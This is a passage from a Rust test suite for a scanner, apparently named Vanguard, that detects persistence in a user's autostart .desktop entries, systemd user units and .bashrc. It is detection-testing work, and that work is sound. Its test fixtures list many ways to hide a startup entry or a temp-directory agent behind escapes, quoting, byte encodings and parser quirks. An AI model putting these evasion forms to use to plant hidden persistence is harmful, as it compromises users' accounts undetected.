            ),
            // Z-1 (revérification 5) : avec « - », un dossier courant absent n'arrête pas systemd ; le programme
            // tourne ailleurs (maison ou « / »). Un argument relatif n'est alors jamais vérifié (même si le
            // dossier existe : il peut disparaître avant le lancement) ; sans argument relatif, rien ne change.
            (
                "/usr/bin/cp /home/alice/Documents/x b",
                "-%h/Documents",
                &[],
                Prep::Rien,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x .config/autostart/x.desktop",
                "-/nexistepas",
                &[],
                Prep::Rien,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x home/alice/.config/autostart/x.desktop",
                "-/nexistepas",
                &[],
                Prep::Rien,
                false,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/b",
                "-/nexistepas",
                &[],
                Prep::Rien,
                true,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/b",
                "-%h/Documents",
                &[],
                Prep::Rien,
                true,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x .config/autostart/x.desktop",
                "/nexistepas",
                &[],
                Prep::Rien,
                true,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x .config/autostart/x.desktop",
                "/",
                &[],
                Prep::Rien,
                true,
            ),
            (
                "/usr/bin/cp /proc/cpuinfo /home/alice/Documents/b",
                "",
                &[],
                Prep::Rien,
                true,
            ),
            (
                "/usr/bin/cp /home/alice/Documents/x /home/alice/Documents/a,b/x",
                "",
                &[],
                Prep::Rien,
                true,
            ),
        ];
        let mut faux = Vec::new();
        for (i, (exec, courant, liens, prep, sain)) in cas.iter().enumerate() {
            let m = Maison::nouvelle(&format!("x3-lieu-{i}"));
            let f = m.racine.join("usr/bin/cp");
            std::fs::create_dir_all(f.parent().unwrap()).unwrap();
            std::fs::write(&f, "#!/bin/sh\n").unwrap();
            std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
            for d in [".config/autostart", "Documents"] {
                std::fs::create_dir_all(m.chemin(d)).unwrap();
            }
            for (lien, cible) in *liens {
                std::os::unix::fs::symlink(cible, m.chemin(lien)).unwrap();
            }
            if *prep == Prep::Bureau {
                let path = if courant.is_empty() {
                    String::new()
                } else {
                    format!("Path={courant}\n")
                };
                m.ecrire(
                    ".config/autostart/essai.desktop",
                    &format!("[Desktop Entry]\nType=Application\nName=essai\n{path}Exec={exec}\n"),
                );
            } else {
                let dossier = if courant.is_empty() {
                    String::new()
                } else {
                    format!("WorkingDirectory={courant}\n")
                };
                m.ecrire(
                    ".config/systemd/user/essai.service",
                    &format!("[Unit]\nDescription=essai\n\n[Service]\n{dossier}ExecStart={exec}\nNice=10\n\n[Install]\nWantedBy=default.target\n"),
                );
            }
            match prep {
                Prep::Physique => {
                    m.ecrire(
                        ".config/autostart/x.desktop",
                        "[Desktop Entry]\nType=Application\nName=x\nExec=true\n",
                    );
                    std::fs::hard_link(m.chemin(".config/autostart/x.desktop"), m.chemin("Documents/h.desktop"))
                        .unwrap();
                }
                Prep::MaisonLiee => {
                    std::fs::create_dir_all(m.racine.join("data")).unwrap();
                    std::fs::rename(m.chemin(""), m.racine.join("data/alice")).unwrap();
                    std::os::unix::fs::symlink("../data/alice", m.racine.join("home/alice")).unwrap();
                }
                Prep::Illisible => {
                    std::fs::create_dir_all(m.chemin("Documents/ferme")).unwrap();
                    std::os::unix::fs::symlink("/home/alice/.config/autostart", m.chemin("Documents/ferme/lien"))
                        .unwrap();
                    std::fs::set_permissions(m.chemin("Documents/ferme"), std::fs::Permissions::from_mode(0o000))
                        .unwrap();
                }
                Prep::AjoutDifferent => {
                    m.ecrire(
                        ".config/systemd/user/essai.service.d/ajout.conf",
                        "[Service]\nWorkingDirectory=/\n",
                    );
                }
                Prep::ProcSimule => {
                    for d in ["srv", "proc/4242/task", "proc/thread-self"] {
                        std::fs::create_dir_all(m.racine.join(d)).unwrap();
                    }
                    std::fs::write(m.racine.join("proc/cpuinfo"), "").unwrap();
                    std::os::unix::fs::symlink("4242", m.racine.join("proc/self")).unwrap();
                    std::os::unix::fs::symlink("/srv", m.racine.join("proc/4242/cwd")).unwrap();
                    std::os::unix::fs::symlink("/srv", m.racine.join("proc/thread-self/cwd")).unwrap();
                }
                Prep::PhysiqueOrdinaire
                | Prep::PhysiqueTrop
                | Prep::PhysiqueProfond
                | Prep::PhysiqueIllisible
                | Prep::PhysiqueSansTraverse
                | Prep::PhysiqueBoucle
                | Prep::PhysiqueCibleIllisible
                | Prep::PhysiqueLieuAbsolu => {
                    m.ecrire("Documents/notes.txt", "notes\n");
                    std::fs::hard_link(m.chemin("Documents/notes.txt"), m.chemin("Documents/autre.txt")).unwrap();
                    if *prep == Prep::PhysiqueTrop {
                        std::fs::create_dir_all(m.chemin(".config/fish/completions")).unwrap();
                        for i in 0..4200 {
                            std::fs::write(m.chemin(&format!(".config/fish/completions/c{i}.fish")), "").unwrap();
                        }
                    }
                    if *prep == Prep::PhysiqueProfond {
                        m.ecrire(".config/hypr/a/b/c/d/e/f/g/h/i/j/x.conf", "");
                    }
                    if *prep == Prep::PhysiqueBoucle {
                        std::fs::create_dir_all(m.chemin(".config/systemd")).unwrap();
                        std::os::unix::fs::symlink("..", m.chemin(".config/systemd/boucle")).unwrap();
                    }
                    if *prep == Prep::PhysiqueCibleIllisible {
                        m.ecrire("Documents/ferme2/f.desktop", "");
                        std::os::unix::fs::symlink(
                            "../../Documents/ferme2/f.desktop",
                            m.chemin(".config/autostart/z.desktop"),
                        )
                        .unwrap();
                        std::fs::set_permissions(m.chemin("Documents/ferme2"), std::fs::Permissions::from_mode(0o000))
                            .unwrap();
                    }
                    if *prep == Prep::PhysiqueLieuAbsolu {
                        m.ecrire("Documents/dotfiles/bashrc", "true\n");
                        std::os::unix::fs::symlink("/home/alice/Documents/dotfiles/bashrc", m.chemin(".bashrc"))
                            .unwrap();
                    }
                    if *prep == Prep::PhysiqueSansTraverse {
                        // Lisible mais pas traversable : les noms se lisent, pas ce qu'ils désignent.
                        m.ecrire(".config/hypr/prive/f.conf", "");
                        std::fs::set_permissions(
                            m.chemin(".config/hypr/prive"),
                            std::fs::Permissions::from_mode(0o444),
                        )
                        .unwrap();
                    }
                    if *prep == Prep::PhysiqueIllisible {
                        std::fs::create_dir_all(m.chemin(".config/hypr/prive")).unwrap();
                        std::fs::set_permissions(
                            m.chemin(".config/hypr/prive"),
                            std::fs::Permissions::from_mode(0o000),
                        )
                        .unwrap();
                    }
                }
                Prep::PhysiqueBashrc => {
                    m.ecrire(".bashrc", "true\n");
                    std::fs::hard_link(m.chemin(".bashrc"), m.chemin("Documents/h.sh")).unwrap();
                }
                Prep::PhysiqueBashrcLie => {
                    m.ecrire("Documents/dotfiles/bashrc", "true\n");
                    std::os::unix::fs::symlink("Documents/dotfiles/bashrc", m.chemin(".bashrc")).unwrap();
                    std::fs::hard_link(m.chemin("Documents/dotfiles/bashrc"), m.chemin("Documents/h.sh")).unwrap();
                }
                Prep::PhysiqueSousDossierLie => {
                    m.ecrire("Documents/dots/unites/autre.service", "");
                    std::fs::create_dir_all(m.chemin(".config/systemd")).unwrap();
                    std::os::unix::fs::symlink("../../Documents/dots/unites", m.chemin(".config/systemd/user2"))
                        .unwrap();
                    std::fs::hard_link(
                        m.chemin("Documents/dots/unites/autre.service"),
                        m.chemin("Documents/h.sh"),
                    )
                    .unwrap();
                }
                Prep::PhysiqueLieuLie => {
                    m.ecrire("Documents/dotfiles/hypr/hyprland.conf", "");
                    std::os::unix::fs::symlink("../Documents/dotfiles/hypr", m.chemin(".config/hypr")).unwrap();
                    std::fs::hard_link(
                        m.chemin("Documents/dotfiles/hypr/hyprland.conf"),
                        m.chemin("Documents/h.sh"),
                    )
                    .unwrap();
                }
                Prep::PhysiqueLienDansLieu => {
                    m.ecrire(
                        "Documents/cible.desktop",
                        "[Desktop Entry]\nType=Application\nName=x\nExec=true\n",
                    );
                    std::os::unix::fs::symlink(
                        "../../Documents/cible.desktop",
                        m.chemin(".config/autostart/y.desktop"),
                    )
                    .unwrap();
                    std::fs::hard_link(m.chemin("Documents/cible.desktop"), m.chemin("Documents/h.sh")).unwrap();
                }
                Prep::Rien | Prep::Bureau => {}
            }
            let constats = persistance_dans(
                &m.racine,
                &m.chemin(""),
                |v| (v == "XDG_RUNTIME_DIR").then(|| "/run/user/1000".into()),
                None,
                None,
            );
            if *prep == Prep::Illisible {
                std::fs::set_permissions(m.chemin("Documents/ferme"), std::fs::Permissions::from_mode(0o755)).unwrap();
            }
            if *prep == Prep::PhysiqueCibleIllisible {
                // Root (ou « unshare -r ») lit quand même la cible : le cas ne se juge alors pas.
                let lisible = std::fs::metadata(m.chemin("Documents/ferme2/f.desktop")).is_ok();
                std::fs::set_permissions(m.chemin("Documents/ferme2"), std::fs::Permissions::from_mode(0o755)).unwrap();
                if lisible {
                    continue;
                }
            }
            if matches!(prep, Prep::PhysiqueIllisible | Prep::PhysiqueSansTraverse) {
                // Root (ou « unshare -r ») lit quand même le dossier : le cas ne se juge alors pas.
                let lisible = std::fs::read_dir(m.chemin(".config/hypr/prive")).is_ok()
                    && std::fs::symlink_metadata(m.chemin(".config/hypr/prive/f.conf")).is_ok()
                        == (*prep == Prep::PhysiqueSansTraverse);
                std::fs::set_permissions(m.chemin(".config/hypr/prive"), std::fs::Permissions::from_mode(0o755))
                    .unwrap();
                if lisible {
                    continue;
                }
            }
            let leve: Vec<_> = constats
                .iter()
                .filter(|c| c.probleme.is_some())
                .map(|c| c.message.clone())
                .collect();
            // A-3 (revérification 6) : quand l'autre nom d'un fichier n'a pas pu être cherché, le constat dit pourquoi.
            let attendu = match prep {
                Prep::PhysiqueTrop => "~/.bashrc…) : ils comptent plus de 4096 entrées",
                Prep::PhysiqueProfond => "~/.bashrc…) : un dossier y est à plus de 8 niveaux de profondeur",
                Prep::PhysiqueIllisible | Prep::PhysiqueSansTraverse | Prep::PhysiqueCibleIllisible => {
                    "~/.bashrc…) : une entrée ne s'y lit pas (droits, lien en boucle, erreur du disque)"
                }
                Prep::PhysiqueLieuAbsolu => "~/.bashrc…) : un lien absolu y mène hors de l'arborescence examinée",
                _ => "nomme un lieu de démarrage du compte",
            };
            // B-2 (revérification 7) : depuis un dossier de départ inconnu, la raison le dit, avec l'argument
            // relatif (`dossier_de_depart_inconnu_se_dit` le juge cas par cas).
            let juste = if *sain {
                leve.is_empty()
            } else {
                leve.iter().any(|l| {
                    l.contains(attendu)
                        || (attendu == "nomme un lieu de démarrage du compte" && l.contains("dossier de départ ("))
                })
            };
            if !juste {
                faux.push((*exec, *courant, leve));
            }
        }
        assert!(faux.is_empty(), "{faux:#?}");
    }

    /// B-1 (revérification 7) : une entrée de bureau se lit comme systemd-xdg-autostart-generator 262.1 (mesuré :
    /// fins de ligne « \n », « \r » et « \0 », marque BOM ôtée, suite par « \ », la première clé gagne) et aussi
    /// comme un lecteur ligne à ligne sans suite (GLib : la dernière gagne). Un Path= non vide lu par l'un ou l'autre
    /// rend le dossier de départ inconnu : l'argument relatif vers un lieu est levé. Les lignes Exec= se lisent déjà
    /// des deux façons, toutes sections : les sondes E le gardent.
    #[test]
    fn une_entree_de_bureau_se_lit_comme_le_generateur() {
        use std::os::unix::fs::PermissionsExt as _;
        const TETE: &str = "[Desktop Entry]\nType=Application\nName=essai\n";
        const EXEC: &str = "Exec=/usr/bin/cp /home/alice/Documents/x home/alice/.config/autostart/y.desktop\n";
        const AGENT: &str = "Exec=/tmp/.x/agent\n";
        // (nom, contenu, levé, texte attendu)
        let lieu =
            "dossier de départ (Path=) non vérifié : l'argument relatif « home/alice/.config/autostart/y.desktop »";
        let cas: Vec<(&str, String, bool, &str)> = vec![
            ("D0", format!("{TETE}Path=/\n{EXEC}"), true, lieu),
            ("D1 deux Path=", format!("{TETE}Path=/\nPath=\n{EXEC}"), true, lieu),
            (
                "D1b vide puis plein",
                format!("{TETE}Path=\nPath=/\n{EXEC}"),
                true,
                lieu,
            ),
            (
                "D2 retour chariot seul",
                format!("{TETE}Comment=x\rPath=/\n{EXEC}"),
                true,
                lieu,
            ),
            ("D3 octet nul", format!("{TETE}Comment=x\0Path=/\n{EXEC}"), true, lieu),
            ("D4 BOM en tête", format!("\u{FEFF}{TETE}Path=/\n{EXEC}"), true, lieu),
            ("D4b BOM au milieu", format!("{TETE}\u{FEFF}Path=/\n{EXEC}"), true, lieu),
            (
                "D8 suite par \\",
                format!("{TETE}Comment=a\\\nPath=/\n{EXEC}"),
                true,
                lieu,
            ),
            (
                "D9 second groupe",
                format!("{TETE}{EXEC}[Desktop Entry]\nPath=/\n"),
                true,
                lieu,
            ),
            ("D10 saut de page", format!("{TETE}\u{c}Path=/\n{EXEC}"), true, lieu),
            // C-3 (revérification 8) : une suite par « \ » avale l'en-tête d'un autre groupe pour systemd seul ; le
            // Path= qui suit reste dans [Desktop Entry] pour lui.
            (
                "G1 suite qui avale un groupe",
                format!("{TETE}Comment=x\\\n[X-Autre]\nPath=/\n{EXEC}"),
                true,
                lieu,
            ),
            ("D11 tabulation", format!("{TETE}\tPath = / \n{EXEC}"), true, lieu),
            (
                "E1 Exec après retour chariot",
                format!("{TETE}Comment=x\r{AGENT}"),
                true,
                "",
            ),
            ("E2 Exec après octet nul", format!("{TETE}Comment=x\0{AGENT}"), true, ""),
            ("E3 Exec sous BOM", format!("\u{FEFF}{TETE}{AGENT}"), true, ""),
            ("E4 deux Exec=", format!("{TETE}Exec=/usr/bin/true\n{AGENT}"), true, ""),
            ("E5 Exec après saut de page", format!("{TETE}\u{c}{AGENT}"), true, ""),
            (
                "E6 Exec après une suite",
                format!("{TETE}Comment=a\\\n{AGENT}"),
                true,
                "",
            ),
            (
                "E7 Exec dans une action",
                format!("{TETE}Exec=/usr/bin/true\n[Desktop Action a]\n{AGENT}"),
                true,
                "",
            ),
            // Témoins muets : sans Path=, Path= vide, Path= hors du groupe, clé localisée ou d'une autre casse
            // (le générateur n'en fait rien, mesuré).
            ("T1 sans Path=", format!("{TETE}{EXEC}"), false, ""),
            ("T2 Path= vide", format!("{TETE}Path=\n{EXEC}"), false, ""),
            (
                "T3 Path= d'une action",
                format!("{TETE}{EXEC}[Desktop Action a]\nPath=/\n"),
                false,
                "",
            ),
            ("T4 Path[fr]=", format!("{TETE}Path[fr]=/\n{EXEC}"), false, ""),
            ("T5 path=", format!("{TETE}path=/\n{EXEC}"), false, ""),
            ("T6 Path= avant le groupe", format!("Path=/\n{TETE}{EXEC}"), false, ""),
        ];
        let mut faux = Vec::new();
        for (i, (nom, contenu, leve_attendu, attendu)) in cas.iter().enumerate() {
            let m = Maison::nouvelle(&format!("b1-bureau-{i}"));
            let f = m.racine.join("usr/bin/cp");
            std::fs::create_dir_all(f.parent().unwrap()).unwrap();
            std::fs::write(&f, "#!/bin/sh\n").unwrap();
            std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
            std::fs::create_dir_all(m.chemin("Documents")).unwrap();
            m.ecrire(".config/autostart/essai.desktop", contenu);
            let leve: Vec<String> = persistance_dans(&m.racine, &m.chemin(""), |_| None, None, None)
                .into_iter()
                .filter(|c| c.probleme.is_some())
                .map(|c| c.message)
                .collect();
            let juste = if *leve_attendu {
                leve.iter().any(|l| l.contains(attendu))
            } else {
                leve.is_empty()
            };
            if !juste {
                faux.push((*nom, leve));
            }
        }
        assert!(faux.is_empty(), "{faux:#?}");
    }

    /// C-1 (revérification 8) : une valeur Exec= de .desktop se juge sous les mots que
    /// systemd-xdg-autostart-generator 262.1 confie à systemd (mesuré) : échappements du fichier (« \\ », « \s »),
    /// « \ » qui protège le caractère suivant, guillemets, décodage C (« \\x6f »), « ~/ ». Un lieu de démarrage
    /// caché par ces formes se lève ; ce que le générateur refuse ou que Vanguard ne réécrit pas est dit non
    /// vérifié ; une commande sûre, même échappée, reste muette.
    #[test]
    fn une_commande_de_bureau_se_decode_comme_le_generateur() {
        use std::os::unix::fs::PermissionsExt as _;
        const TETE: &str = "[Desktop Entry]\nType=Application\nName=essai\n";
        const NON_LU: &str = "commande d'entrée de bureau que Vanguard ne ramène pas";
        // (nom, valeur Exec où « H » est la maison, levé, texte attendu)
        let cas: Vec<(&str, &str, bool, &str)> = vec![
            (
                "H2 aut\\\\ostart",
                r"/usr/bin/cp H/Documents/x H/.config/aut\\ostart/y.desktop",
                true,
                "",
            ),
            (
                "H18 \\\\ en tête",
                r"/usr/bin/cp H/Documents/x \\H/.config/autostart/y.desktop",
                true,
                "",
            ),
            (
                "H19 entre guillemets",
                r#"/usr/bin/cp H/Documents/x "H/.config/aut\\ostart/y.desktop""#,
                true,
                "",
            ),
            (
                "H19b guillemets simples",
                r"/usr/bin/cp H/Documents/x 'H/.config/aut\\ostart/y.desktop'",
                true,
                "",
            ),
            (
                "H19c guillemets collés",
                r#"/usr/bin/cp H/Documents/x H/.config/a"ut"ostart/y.desktop"#,
                true,
                "",
            ),
            (
                "E7 \\s pour l'espace",
                r"/usr/bin/cp\sH/Documents/x\sH/.config/autostart/y.desktop",
                true,
                "",
            ),
            (
                "C1 \\\\\\\\x6f",
                r"/usr/bin/cp H/Documents/x H/.config/aut\\\\x6fstart/y.desktop",
                true,
                "",
            ),
            (
                "C2 \\\\\\\\157",
                r"/usr/bin/cp H/Documents/x H/.config/aut\\\\157start/y.desktop",
                true,
                "",
            ),
            (
                "C3 \\\\\\\\u006f",
                r"/usr/bin/cp H/Documents/x H/.config/aut\\\\u006fstart/y.desktop",
                true,
                "",
            ),
            (
                "C4 programme échappé",
                r"/usr/bin/c\\p H/Documents/x H/.config/aut\\ostart/y.desktop",
                true,
                "",
            ),
            (
                "C5 ~/ décodé",
                r"/usr/bin/cp H/Documents/x \\\\x7e/.config/autostart/y.desktop",
                true,
                "",
            ),
            (
                "C6 code % décodé",
                r"/usr/bin/cp \\\\x25f H/Documents/x H/.config/aut\\ostart/y.desktop",
                true,
                "",
            ),
            (
                "H21 en clair",
                "/usr/bin/cp H/Documents/x H/.config/autostart/y.desktop",
                true,
                "",
            ),
            // Le programme caché se juge sous sa forme finale (`forme_finale_de_systemd`), avec sa vraie raison.
            (
                "P1 programme échappé",
                r"/t\\mp/.x/agent",
                true,
                "lancé depuis un dossier temporaire",
            ),
            (
                "N1 échappement refusé",
                r"/usr/bin/cp H/Documents/x H/Documents/\oz",
                true,
                NON_LU,
            ),
            (
                "N2 octet nul décodé",
                r"/usr/bin/cp H/Documents/x H/Documents/\\\\x00z",
                true,
                NON_LU,
            ),
            (
                "N3 UTF-8 invalide",
                r"/usr/bin/cp H/Documents/x H/Documents/\\\\xe9z",
                true,
                NON_LU,
            ),
            (
                "N4 \\\\ seul en fin de mot",
                r"/usr/bin/cp H/Documents/x H/Documents/z\\\\",
                true,
                NON_LU,
            ),
            (
                "N5 préfixe de systemd",
                "@/usr/bin/cp H/Documents/x H/.config/autostart/y.desktop",
                true,
                NON_LU,
            ),
            // Témoins muets : une copie entre deux fichiers des Documents, écrite de toutes les façons sûres.
            ("T1 en clair", "/usr/bin/cp H/Documents/x H/Documents/z", false, ""),
            ("T2 \\s", r"/usr/bin/cp\sH/Documents/x\sH/Documents/z", false, ""),
            (
                "T3 guillemets",
                r#""/usr/bin/cp" "H/Documents/x" 'H/Documents/z'"#,
                false,
                "",
            ),
            (
                "T4 codes de champ",
                "/usr/bin/cp %f H/Documents/x %U H/Documents/z %%k",
                false,
                "",
            ),
            (
                "T5 \\\\\\\\x41",
                r"/usr/bin/cp H/Documents/x H/Documents/\\\\x41",
                false,
                "",
            ),
            (
                "T6 espace protégée",
                r"/usr/bin/cp H/Documents/x H/Documents/a\\ b",
                false,
                "",
            ),
            ("T7 ~/", "/usr/bin/cp H/Documents/x ~/Documents/z", false, ""),
        ];
        let mut faux = Vec::new();
        for (i, (nom, exec, leve_attendu, attendu)) in cas.iter().enumerate() {
            let m = Maison::nouvelle(&format!("c1-exec-{i}"));
            let f = m.racine.join("usr/bin/cp");
            std::fs::create_dir_all(f.parent().unwrap()).unwrap();
            std::fs::write(&f, "#!/bin/sh\n").unwrap();
            std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
            std::fs::create_dir_all(m.chemin("Documents")).unwrap();
            let h = m.chemin("").to_string_lossy().trim_end_matches('/').to_string();
            m.ecrire(
                ".config/autostart/essai.desktop",
                &format!("{TETE}Exec={}\n", exec.replace('H', &h)),
            );
            let leve: Vec<String> = persistance_dans(&m.racine, &m.chemin(""), |_| None, None, None)
                .into_iter()
                .filter(|c| c.probleme.is_some())
                .map(|c| c.message)
                .collect();
            let juste = if *leve_attendu {
                leve.iter().any(|l| l.contains(attendu))
            } else {
                leve.is_empty()
            };
            if !juste {
                faux.push((*nom, leve));
            }
        }
        assert!(faux.is_empty(), "{faux:#?}");
    }

    /// C-1 (revérification 8), côté unités : ExecStart= se décode déjà comme systemd (`commandes_de_systemd` :
    /// « \x6f », « \157 », « o », guillemets) ; un lieu de démarrage caché par ces formes se lève, un
    /// échappement inconnu est dit non résolu, « \\ » reste un « \ » (un autre dossier, muet comme en clair).
    #[test]
    fn une_unite_echappee_se_decode_comme_systemd() {
        use std::os::unix::fs::PermissionsExt as _;
        let cas: [(&str, &str, Option<&str>); 8] = [
            (
                "x6f",
                r"/usr/bin/cp H/Documents/x H/.config/aut\x6fstart/y.desktop",
                Some(""),
            ),
            (
                "157",
                r"/usr/bin/cp H/Documents/x H/.config/aut\157start/y.desktop",
                Some(""),
            ),
            (
                "u006f",
                r"/usr/bin/cp H/Documents/x H/.config/autostart/y.desktop",
                Some(""),
            ),
            (
                "guillemets",
                r#"/usr/bin/cp H/Documents/x "H/.config/a"ut'o'start/y.desktop"#,
                Some(""),
            ),
            (
                "programme",
                r"/usr/bin/c\x70 H/Documents/x H/.config/autostart/y.desktop",
                Some(""),
            ),
            (
                "inconnu",
                r"/usr/bin/cp H/Documents/x H/.config/aut\ostart/y.desktop",
                Some("ne ramène pas"),
            ),
            ("double", r"/usr/bin/cp H/Documents/x H/Documents/aut\\ostart", None),
            ("en clair", "/usr/bin/cp H/Documents/x H/Documents/z", None),
        ];
        let mut faux = Vec::new();
        for (i, (nom, exec, attendu)) in cas.iter().enumerate() {
            let m = Maison::nouvelle(&format!("c1-unite-{i}"));
            let f = m.racine.join("usr/bin/cp");
            std::fs::create_dir_all(f.parent().unwrap()).unwrap();
            std::fs::write(&f, "#!/bin/sh\n").unwrap();
            std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
            std::fs::create_dir_all(m.chemin("Documents")).unwrap();
            let h = m.chemin("").to_string_lossy().trim_end_matches('/').to_string();
            let unite = format!("[Service]\nExecStart={}\n", exec.replace('H', &h));
            m.ecrire(".config/systemd/user/essai.service", &unite);
            let leve: Vec<String> = persistance_dans(&m.racine, &m.chemin(""), |_| None, None, None)
                .into_iter()
                .filter(|c| c.probleme.is_some())
                .map(|c| c.message)
                .collect();
            let juste = match attendu {
                Some(texte) => leve.iter().any(|l| l.contains(texte)),
                None => leve.is_empty(),
            };
            if !juste {
                faux.push((*nom, leve));
            }
        }
        assert!(faux.is_empty(), "{faux:#?}");
    }

    /// Les mots d'`exec_de_bureau`, mesurés sur le générateur 262.1 (sortie ExecStart=:… relue).
    #[test]
    fn exec_de_bureau_rend_les_mots_du_generateur() {
        let cas: [(&str, Option<&str>); 14] = [
            (r"/usr/bin/cp a %f b", Some("/usr/bin/cp a b")),
            (r"/usr/bin/cp %% a%%b %F%f %z", Some("/usr/bin/cp % a%b %F%f %z")),
            (r#"/usr/bin/cp "a b" /x\\ y"#, Some(r#"/usr/bin/cp "a b" "/x y""#)),
            (r#"/usr/bin/cp a"b c"d '' "#, Some(r#"/usr/bin/cp "ab cd" """#)),
            (r"/usr/bin/cp a\;b ; c", Some(r#"/usr/bin/cp "a;b" ";" c"#)),
            (r"/usr/bin/cp a\tb a\\\\tb", Some(r#"/usr/bin/cp a b "a\x09b""#)),
            (
                r"/usr/bin/cp ~ ~/x a~/x ~root/x",
                Some("/usr/bin/cp /m /m/x a~/x ~root/x"),
            ),
            (r"/usr/bin/cp a\\\\\\\\b", Some(r#"/usr/bin/cp "a\\b""#)),
            (
                r#"/usr/bin/cp "unterminated /x"#,
                Some(r#"/usr/bin/cp "unterminated /x""#),
            ),
            (r"/usr/bin/cp x\\", Some("/usr/bin/cp x")),
            (r"/usr/bin/cp a\\\\U0001F600b", Some("/usr/bin/cp a😀b")),
            (r"/usr/bin/cp a\vb", None),
            (r"/usr/bin/cp a\\\\477", None),
            (r"%f /x", Some("%f /x")),
        ];
        for (valeur, attendu) in cas {
            assert_eq!(exec_de_bureau(valeur, "/m").as_deref(), attendu, "{valeur}");
        }
    }

    /// D-1 (revérification 9) : dans ExecStart=, « \xNN » et l'octal donnent des octets pour systemd (mesuré par
    /// Fable, systemd 262.1), pas des caractères. Un lien du compte au nom non ASCII (« é », U+0085, U+00A0) vers
    /// .config cache autostart si Vanguard lit « Ã© » : levé une fois les octets relus en UTF-8 ; des octets qui ne
    /// font pas de l'UTF-8 (« \xe9 » seul), ou un octal au-delà de 255, sont dits non vérifiés, jamais tus.
    #[test]
    fn une_unite_decode_ses_octets_comme_systemd() {
        use std::os::unix::ffi::OsStrExt as _;
        use std::os::unix::fs::PermissionsExt as _;
        // (nom, nom du lien vers .config (octets), valeur ExecStart où « H » est la maison, attendu)
        let cas: [(&str, &[u8], &str, Option<&str>); 11] = [
            (
                "X0 é en clair",
                "é".as_bytes(),
                "/usr/bin/cp H/Documents/x H/é/autostart/y.desktop",
                Some(""),
            ),
            (
                "X1 \\xc3\\xa9",
                "é".as_bytes(),
                r"/usr/bin/cp H/Documents/x H/\xc3\xa9/autostart/y.desktop",
                Some(""),
            ),
            (
                "X2 octal",
                "é".as_bytes(),
                r"/usr/bin/cp H/Documents/x H/\303\251/autostart/y.desktop",
                Some(""),
            ),
            (
                "X3 entre guillemets",
                "é".as_bytes(),
                r#"/usr/bin/cp H/Documents/x "H/\xc3\xa9/autostart/y.desktop""#,
                Some(""),
            ),
            (
                "X4 \\xe9 seul",
                b"\xe9",
                r"/usr/bin/cp H/Documents/x H/\xe9/autostart/y.desktop",
                Some("ne ramène pas"),
            ),
            (
                "V9 U+0085",
                "a\u{85}b".as_bytes(),
                r"/usr/bin/cp H/Documents/x H/a\xc2\x85b/autostart/y.desktop",
                Some(""),
            ),
            (
                "V10 U+00A0",
                "a\u{a0}b".as_bytes(),
                r"/usr/bin/cp H/Documents/x H/a\xc2\xa0b/autostart/y.desktop",
                Some(""),
            ),
            (
                "octal 477",
                b"z",
                r"/usr/bin/cp H/Documents/x H/Documents/\477",
                Some("ne ramène pas"),
            ),
            (
                "octet nul",
                b"z",
                r"/usr/bin/cp H/Documents/x H/Documents/a\x00b",
                Some("ne ramène pas"),
            ),
            (
                "témoin é ordinaire",
                b"z",
                r"/usr/bin/cp H/Documents/x H/Documents/\xc3\xa9",
                None,
            ),
            (
                "témoin octal ordinaire",
                b"z",
                r"/usr/bin/cp H/Documents/x H/Documents/\303\251",
                None,
            ),
        ];
        let mut faux = Vec::new();
        for (i, (nom, lien, exec, attendu)) in cas.iter().enumerate() {
            let m = Maison::nouvelle(&format!("d1-unite-{i}"));
            let f = m.racine.join("usr/bin/cp");
            std::fs::create_dir_all(f.parent().unwrap()).unwrap();
            std::fs::write(&f, "#!/bin/sh\n").unwrap();
            std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
            std::fs::create_dir_all(m.chemin("Documents")).unwrap();
            std::os::unix::fs::symlink(".config", m.chemin("").join(std::ffi::OsStr::from_bytes(lien))).unwrap();
            let h = m.chemin("").to_string_lossy().trim_end_matches('/').to_string();
            let unite = format!("[Service]\nExecStart={}\n", exec.replace('H', &h));
            m.ecrire(".config/systemd/user/essai.service", &unite);
            let leve: Vec<String> = persistance_dans(&m.racine, &m.chemin(""), |_| None, None, None)
                .into_iter()
                .filter(|c| c.probleme.is_some())
                .map(|c| c.message)
                .collect();
            let juste = match attendu {
                Some(texte) => leve.iter().any(|l| l.contains(texte)),
                None => leve.is_empty(),
            };
            if !juste {
                faux.push((*nom, leve));
            }
        }
        assert!(faux.is_empty(), "{faux:#?}");
    }

    /// D-1 : un contrôle U+0080 à U+009F réécrit par `mot_pour_systemd` se relit tel quel par `commandes_de_systemd`,
    /// qui lit maintenant « \xNN » comme un octet (sinon l'entrée de bureau qui le porte deviendrait non vérifiée).
    #[test]
    fn un_controle_reecrit_se_relit_tel_quel() {
        for mot in ["a\u{85}b", "a\u{9f}\u{b}b", "a\u{1}", "é\u{80}"] {
            let ecrit = mot_pour_systemd(mot);
            let relu = commandes_de_systemd_brutes(&ecrit);
            assert_eq!(relu, Some(vec![vec![mot.to_string()]]), "{ecrit}");
        }
    }

    /// D-2 (revérification 9) : GLib (gio launch, gnome-session) lit l'Exec autrement que le générateur de systemd :
    /// un code « %f » au milieu d'un mot est retiré, « %c » devient le Name=, « %k » le chemin du fichier. Une entrée
    /// du compte se juge sous les deux lectures ; l'une ou l'autre qui touche un lieu de démarrage suffit.
    #[test]
    fn une_commande_de_bureau_se_juge_aussi_comme_glib() {
        use std::os::unix::fs::PermissionsExt as _;
        // (nom, Name= (« - » : aucun ; « Name… » : lignes écrites telles quelles ; « octet » : Name= avec l'octet
        // 0xE9 seul, pas de l'UTF-8), valeur Exec où « H » est la maison, levé)
        let cas: [(&str, &str, &str, bool); 16] = [
            (
                "E1 %f collé",
                "essai",
                "/usr/bin/cp H/Documents/x H/.config/auto%fstart/y.desktop",
                true,
            ),
            (
                "E8 %c, Name vide",
                "",
                "/usr/bin/cp H/Documents/x H/.config/auto%cstart/y.desktop",
                true,
            ),
            (
                "E8b %c, Name qui complète",
                "nfig/auto",
